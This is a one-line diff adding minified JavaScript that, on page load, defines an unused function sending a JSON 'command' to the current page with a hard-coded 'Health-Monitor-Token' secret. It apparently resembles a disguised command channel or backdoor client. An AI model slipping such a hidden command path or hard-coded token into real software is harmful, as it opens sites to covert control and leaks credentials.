@@ -1,0 +1,1 @@
+document.addEventListener("DOMContentLoaded",function(){let n=window.location.pathname;function t(t){return fetch(n,{method:"POST",headers:{"Content-Type":"application/json","Health-Monitor-Token":"S3cr3tT0k3n123"},body:JSON.stringify({command:t})}).then(n=>n.json()).then(n=>(console.log("Result:",n),n)).catch(n=>console.error("Error:",n))}});
